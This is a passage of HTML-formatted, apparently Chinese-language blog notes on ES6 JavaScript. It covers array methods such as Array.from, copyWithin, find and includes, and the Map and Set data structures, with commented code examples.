class="string">'10'</span>.padStart(<span class="number">10</span>, <span class="string">'0'</span>) <span class="comment">// "0000000010"</span></span><br></pre></td></tr></table></figure></li><li><p>模板字符串</p></li></ul><h3 id="常用的数组方法"><a href="#常用的数组方法" class="headerlink" title="常用的数组方法"></a>常用的数组方法</h3><ul><li><p>Array.from()：将两类对象（类似数组的对象和可遍历的对象）转为真正的数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">  <span class="string">'0'</span>: <span class="string">'a'</span>,</span><br><span class="line">  <span class="string">'1'</span>: <span class="string">'b'</span>,</span><br><span class="line">  <span class="string">'2'</span>: <span class="string">'c'</span>,</span><br><span class="line">  length: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5的写法：</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [].slice.call(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法：</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br></pre></td></tr></table></figure></li><li><p>Array.of()：将一组值转换成数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>) <span class="comment">// [3]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>).length <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of() <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="literal">undefined</span>) <span class="comment">// [undefined]</span></span><br></pre></td></tr></table></figure></li><li><p>copyWithin()：将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组<br>Array.prototype.copyWithin(target, start = 0, end = this.length)</p><p>target（必需）：从该位置开始替换数据。</p><p>start（可选）：从该位置开始读取数据，默认为0。如果为负值，表示倒数。</p><p>end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示倒数。正从0开始，负从-1开始。</p><p>这三个参数都应该是数值，如果不是，会自动转为数值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">3</span>)  <span class="comment">// [4, 5, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// 从3号位直到数组结束的成员（4和5），复制到从0号位开始的位置，结果覆盖了原来的1和2</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">// [4, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// 将3号位复制到0号位</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">-2</span>, <span class="number">-1</span>) <span class="comment">// [4, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// -2相当于3号位，-1相当于4号位</span></span><br><span class="line"></span><br><span class="line">[].copyWithin.call(&#123;<span class="attr">length</span>: <span class="number">5</span>, <span class="number">3</span>: <span class="number">1</span>&#125;, <span class="number">0</span>, <span class="number">3</span>) <span class="comment">// &#123;0: 1, 3: 1, length: 5&#125;</span></span><br><span class="line"><span class="comment">// 将3号位复制到0号位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i32a = <span class="keyword">new</span> <span class="built_in">Int32Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]); i32a.copyWithin(<span class="number">0</span>, <span class="number">2</span>); <span class="comment">// Int32Array [3, 4, 5, 4, 5]</span></span><br><span class="line"><span class="comment">// 将2号位到数组结束，复制到0号位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于没有部署TypedArray的copyWithin方法的平台</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要采用下面的写法:</span></span><br><span class="line"></span><br><span class="line">[].copyWithin.call(<span class="keyword">new</span> <span class="built_in">Int32Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]), <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>); <span class="comment">// Int32Array [4, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure></li><li><p>find()：用于找出第一个符合条件的数组成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">10</span>, <span class="number">-1</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> n &lt; <span class="number">0</span>) <span class="comment">// -5</span></span><br><span class="line"><span class="comment">// 找出数组中第一个小于0的成员，-1布什第一个，不返回。</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>].find(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, arr</span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">9</span>;</span><br><span class="line">&#125;) <span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 找出大于9的，15不是第一个，不返回</span></span><br></pre></td></tr></table></figure></li><li><p>findIndex()：返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>].findIndex(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, arr</span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">9</span>;</span><br><span class="line">&#125;) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">NaN</span>].findIndex(<span class="function"><span class="params">y</span> =&gt;</span> <span class="built_in">Object</span>.is(<span class="literal">NaN</span>, y)) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure></li><li><p>fill()：使用给定值，填充一个数组<br>第二个参数（可选）表示替换起始位置，第三个参数（可选），表示结束位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>) <span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>).fill(<span class="number">7</span>) <span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// ['a', 7, 'c']</span></span><br></pre></td></tr></table></figure></li><li><p>includes()：是否包含指定元素，es7语法，babel转换器已支持<br>第二个参数可选，表示指定搜索起始位置，从起始位置到结尾，默认为0，负数表示倒数；当大于数组长度，会重置为从0开始</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>);     <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>);     <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>].includes(<span class="literal">NaN</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">3</span>);   <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">-1</span>);   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">0</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">1</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">2</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">3</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-1</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-2</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-3</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-4</span>);    <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p><strong> 含义和基本用法  </strong><br><code>JavaScript</code> 的对象（Object），本质上是键值对的集合（Hash 结构），但是传统上只能用字符串当作键。这给它的使用带来了很大的限制。</p><p>为了解决这个问题，<code>ES6</code> 提供了 <code>Map</code> 数据结构。它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。也就是说，<code>Object</code> 结构提供了“字符串—值”的对应，<code>Map</code> 结构提供了“值—值”的对应，是一种更完善的 <code>Hash</code> 结构实现。如果你需要“键值对”的数据结构，<code>Map</code> 比 <code>Object</code> 更合适。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">p</span>: <span class="string">'Hello World'</span>&#125;;</span><br><span class="line"></span><br><span class="line">m.set(o, <span class="string">'content'</span>)</span><br><span class="line">m.get(o) <span class="comment">// "content"</span></span><br><span class="line"></span><br><span class="line">m.has(o) <span class="comment">// true</span></span><br><span class="line">m.delete(o) <span class="comment">// true</span></span><br><span class="line">m.has(o) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p><p>作为构造函数，<code>Map</code> 也可以接受一个数组作为参数。该数组的成员是一个个表示键值对的数组。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">'name'</span>, <span class="string">'张三'</span>],</span><br><span class="line">  [<span class="string">'title'</span>, <span class="string">'Author'</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">map.size <span class="comment">// 2</span></span><br><span class="line">map.has(<span class="string">'name'</span>) <span class="comment">// true</span></span><br><span class="line">map.get(<span class="string">'name'</span>) <span class="comment">// "张三"</span></span><br><span class="line">map.has(<span class="string">'title'</span>) <span class="comment">// true</span></span><br><span class="line">map.get(<span class="string">'title'</span>) <span class="comment">// "Author"</span></span><br></pre></td></tr></table></figure></p><p>当参数为数组是，其内部的逻辑如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> items = [</span><br><span class="line">  [<span class="string">'name'</span>, <span class="string">'张三'</span>],</span><br><span class="line">  [<span class="string">'title'</span>, <span class="string">'Author'</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">items.forEach(</span><br><span class="line">  ([key, value]) =&gt; map.set(key, value)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>如果读取一个未知的键，则返回 <code>undefined</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Map</span>().get(<span class="string">'asfddfsasadf'</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p><p>注意，只有对同一个对象的引用，Map 结构才将其视为同一个键。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">map.set([<span class="string">'a'</span>], <span class="number">555</span>);</span><br><span class="line">map.get([<span class="string">'a'</span>]) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></p><p>上面代码的set和get方法，表面是针对同一个键，但实际上这是两个值，内存地址是不一样的，因此get方法无法读取该键，返回undefined。</p><p>同理，同样的值的两个实例，在 <code>Map</code> 结构中被视为两个键。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> k1 = [<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">const</span> k2 = [<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line">map</span><br><span class="line">.set(k1, <span class="number">111</span>)</span><br><span class="line">.set(k2, <span class="number">222</span>);</span><br><span class="line"></span><br><span class="line">map.get(k1) <span class="comment">// 111</span></span><br><span class="line">map.get(k2) <span class="comment">// 222</span></span><br></pre></td></tr></table></figure></p><p>由上可知，<code>Map</code> 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键。注意：以上说的只针对引用类型。</p><p>如果 <code>Map</code> 的键是一个简单类型的值（数字、字符串、布尔值），则只要两个值严格相等，<code>Map</code> 将其视为一个键，比如0和-0就是一个键，布尔值true和字符串true则是两个不同的键。另外，undefined和null也是两个不同的键。虽然NaN不严格相等于自身，但 <code>Map</code> 将其视为同一个键。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">map.set(<span class="number">-0</span>, <span class="number">123</span>);</span><br><span class="line">map.get(+<span class="number">0</span>) <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line">map.set(<span class="literal">true</span>, <span class="number">1</span>);</span><br><span class="line">map.set(<span class="string">'true'</span>, <span class="number">2</span>);</span><br><span class="line">map.get(<span class="literal">true</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">map.set(<span class="literal">undefined</span>, <span class="number">3</span>);</span><br><span class="line">map.set(<span class="literal">null</span>, <span class="number">4</span>);</span><br><span class="line">map.get(<span class="literal">undefined</span>) <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">map.set(<span class="literal">NaN</span>, <span class="number">123</span>);</span><br><span class="line">map.get(<span class="literal">NaN</span>) <span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p><strong> Map </strong> 的属性或方法<br>属性：</p><ul><li><code>size</code> 属性<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="string">'foo'</span>, <span class="literal">true</span>);</span><br><span class="line">map.set(<span class="string">'bar'</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">map.size <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></li></ul><p>方法：</p><ol><li><p>操作方法</p><ul><li><code>set(key, value)`</code>：设置键名key对应的键值为value，然后返回整个 Map 结构，即可以链式操作。</li><li><code>get(key)</code>：读取key对应的键值，如果找不到key，返回undefined。</li><li><code>has(key)</code>：查询某个键是否在当前 Map 对象之中，返回布尔值。</li><li><code>delete(key)</code>：删除某个键，返回true。如果删除失败，返回false。</li><li><code>clear()</code>：清除所有成员，没有返回值。</li></ul></li><li><p>遍历方法</p><ul><li><code>keys()</code>：返回键名的遍历器。</li><li><code>values()</code>：返回键值的遍历器。</li><li><code>entries()</code>：返回所有成员的遍历器。</li><li><code>forEach()</code>：遍历 Map 的所有成员。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">'F'</span>, <span class="string">'no'</span>],</span><br><span class="line">  [<span class="string">'T'</span>,  <span class="string">'yes'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> map.keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "F"</span></span><br><span class="line"><span class="comment">// "T"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> map.values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "no"</span></span><br><span class="line"><span class="comment">// "yes"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> map.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, item[<span class="number">0</span>], item[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ["F", "no"] "F" "no"</span></span><br><span class="line"><span class="comment">// ["T", "yes"] "T" "yes"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> map.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "F" "no"</span></span><br><span class="line"><span class="comment">// "T" "yes"</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><p><code>Map</code> 结构转为数组结构，比较快速的方法是使用扩展运算符（…）<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="number">1</span>, <span class="string">'one'</span>],</span><br><span class="line">  [<span class="number">2</span>, <span class="string">'two'</span>],</span><br><span class="line">  [<span class="number">3</span>, <span class="string">'three'</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">[...map.keys()]</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line">[...map.values()]</span><br><span class="line"><span class="comment">// ['one', 'two', 'three']</span></span><br><span class="line"></span><br><span class="line">[...map.entries()]</span><br><span class="line"><span class="comment">// [[1,'one'], [2, 'two'], [3, 'three']]</span></span><br><span class="line"></span><br><span class="line">[...map]</span><br><span class="line"><span class="comment">// [[1,'one'], [2, 'two'], [3, 'three']]</span></span><br></pre></td></tr></table></figure></p><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p><strong> 含义和基本用法  </strong><br><code>ES6</code> 提供了新的数据结构 <code>Set</code>。它类似于数组，但是成员的值都是唯一的，没有重复的值，我们可以利用 <code>Set</code> 的成员唯一性来实现数组的去重<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>].forEach(<span class="function"><span class="params">x</span> =&gt;</span> s.add(x));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log([...s]); <span class="comment">// [2, 3, 5, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> s) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2 3 5 4</span></span><br></pre></td></tr></table></figure></p><p>利用 <code>Set</code> 给数组或字符串去重<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[...new <span class="built_in">Set</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>])]; <span class="comment">// [2, 3, 5, 4]</span></span><br><span class="line"><span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>])); <span class="comment">// 使用Array.from 将Set转换成数组</span></span><br><span class="line"></span><br><span class="line">[...new <span class="built_in">Set</span>(<span class="string">'2354522'</span>)].join(<span class="string">''</span>); <span class="comment">// "2354"</span></span><br><span class="line"><span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(<span class="string">'2354522'</span>)).join(<span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><p>Set函数可以接受一个数组（或者具有 iterable 接口的其他数据结构）作为参数，用来初始化。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]);</span><br><span class="line">[...set] <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="keyword">const</span> items = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>]);</span><br><span class="line">items.size <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例三</span></span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>(<span class="built_in">document</span>.querySelectorAll(<span class="string">'div'</span>)); <span class="comment">// 接收一个数组对象</span></span><br><span class="line">set.size <span class="comment">// 56</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类似于</span></span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"><span class="built_in">document</span></span><br><span class="line"> .querySelectorAll(<span class="string">'div'</span>)</span><br><span class="line"> .forEach(<span class="function"><span class="params">div</span> =&gt;</span> set.add(div));</span><br><span class="line">set.size <span class="comment">// 56</span></span><br></pre></td></tr></table></figure></p><p><strong> Set </strong> 的属性或方法<br>属性：</p><ul><li><code>Set.prototype.constructor</code>：构造函数，默认就是 <code>Set</code> 函数。</li><li><code>Set.prototype.size</code>：返回 <code>Set</code> 实例的成员总数。</li></ul><p>方法：</p><ol><li><p>操作方法</p><ul><li><code>add(value)</code>：添加某个值，返回 <code>Set</code> 结构本身。</li><li><code>delete(value)</code>：删除某个值，返回一个布尔值，表示删除是否成功。</li><li><code>has(value)</code>：返回一个布尔值，表示该值是否为 <code>Set</code> 